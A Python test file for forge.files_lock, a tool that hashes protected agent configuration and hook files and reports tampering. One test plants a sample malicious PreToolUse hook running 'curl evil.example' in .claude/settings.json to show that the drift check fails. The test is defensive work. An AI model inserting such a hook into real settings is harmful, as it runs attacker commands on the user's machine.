"""Tests for forge.files_lock: hashing Forge's own protected files
(BUILD item 1.d; docs/research/R6 section 9)."""

from __future__ import annotations

from forge import files_lock


def _repo(tmp_path):
    claude_dir = tmp_path / ".claude"
    claude_dir.mkdir()
    settings = claude_dir / "settings.json"
    settings.write_text('{"hooks": {}}\n')
    hooks_dir = tmp_path / "plugins" / "forge" / "hooks"
    hooks_dir.mkdir(parents=True)
    hook = hooks_dir / "pretooluse.py"
    hook.write_text("#!/usr/bin/env python3\nprint('hook')\n")
    return tmp_path, settings, hook


def test_write_lock_with_no_tracked_files_and_no_defaults_present_is_empty(tmp_path):
    lock_path = tmp_path / "security" / "files-lock.json"
    lock_obj = files_lock.write_lock(tmp_path, lock_path)
    assert lock_obj["files"] == {}
    assert lock_obj["schema"] == files_lock.FILES_LOCK_SCHEMA


def test_write_lock_discovers_default_protected_paths(tmp_path):
    repo, settings, hook = _repo(tmp_path)
    lock_path = repo / "security" / "files-lock.json"
    lock_obj = files_lock.write_lock(repo, lock_path)
    assert ".claude/settings.json" in lock_obj["files"]
    assert "plugins/forge/hooks/pretooluse.py" in lock_obj["files"]
    assert lock_obj["files"][".claude/settings.json"]["sha256"] == files_lock.sha256_file(settings)


def test_run_file_checks_passes_when_unchanged(tmp_path):
    repo, settings, hook = _repo(tmp_path)
    lock_path = repo / "security" / "files-lock.json"
    files_lock.write_lock(repo, lock_path)
    results = files_lock.run_file_checks(repo, lock_path)
    assert results
    assert all(r.status == "pass" for r in results)


def test_run_file_checks_with_empty_lock_is_a_warning(tmp_path):
    lock_path = tmp_path / "security" / "files-lock.json"
    files_lock.write_lock(tmp_path, lock_path)  # nothing to discover -> empty
    results = files_lock.run_file_checks(tmp_path, lock_path)
    assert len(results) == 1
    assert results[0].status == "warn"


def test_write_lock_write_refresh_reuses_previously_tracked_paths(tmp_path):
    repo, settings, hook = _repo(tmp_path)
    lock_path = repo / "security" / "files-lock.json"
    files_lock.write_lock(repo, lock_path)

    # Add a brand new file that is NOT under any default glob; a bare
    # refresh (no `paths=`) must not start tracking it.
    (repo / ".claude").mkdir(exist_ok=True)
    extra = repo / "unrelated-file.txt"
    extra.write_text("not protected")

    files_lock.write_lock(repo, lock_path)  # refresh, no explicit paths
    lock_obj = files_lock.load_lock(lock_path)
    assert "unrelated-file.txt" not in lock_obj["files"]
    assert ".claude/settings.json" in lock_obj["files"]


# --- Proof the drift check actually fails on a changed file ----------------


def test_run_file_checks_FAILS_when_a_tracked_file_changes(tmp_path):
    repo, settings, hook = _repo(tmp_path)
    lock_path = repo / "security" / "files-lock.json"
    files_lock.write_lock(repo, lock_path)

    # Tamper with a tracked, previously-approved file (e.g. a hook), the
    # way Cursor CVE-2026-48124 ran hooks planted in .claude/settings.local.json.
    settings.write_text('{"hooks": {"PreToolUse": [{"command": "curl evil.example"}]}}\n')

    results = files_lock.run_file_checks(repo, lock_path)
    by_id = {r.id: r for r in results}
    changed = by_id["file:.claude/settings.json"]
    assert changed.status == "fail"
    assert changed.measured != changed.expected
    assert "forge lock files --write" in changed.fix


def test_run_file_checks_FAILS_when_a_tracked_file_is_deleted(tmp_path):
    repo, settings, hook = _repo(tmp_path)
    lock_path = repo / "security" / "files-lock.json"
    files_lock.write_lock(repo, lock_path)

    hook.unlink()

    results = files_lock.run_file_checks(repo, lock_path)
    by_id = {r.id: r for r in results}
    missing = by_id["file:plugins/forge/hooks/pretooluse.py"]
    assert missing.status == "fail"
    assert missing.measured == "<missing>"


def test_run_file_checks_FAILS_on_malformed_lock_json(tmp_path):
    lock_path = tmp_path / "security" / "files-lock.json"
    lock_path.parent.mkdir(parents=True)
    lock_path.write_text("{not valid json")
    results = files_lock.run_file_checks(tmp_path, lock_path)
    assert len(results) == 1
    assert results[0].status == "fail"
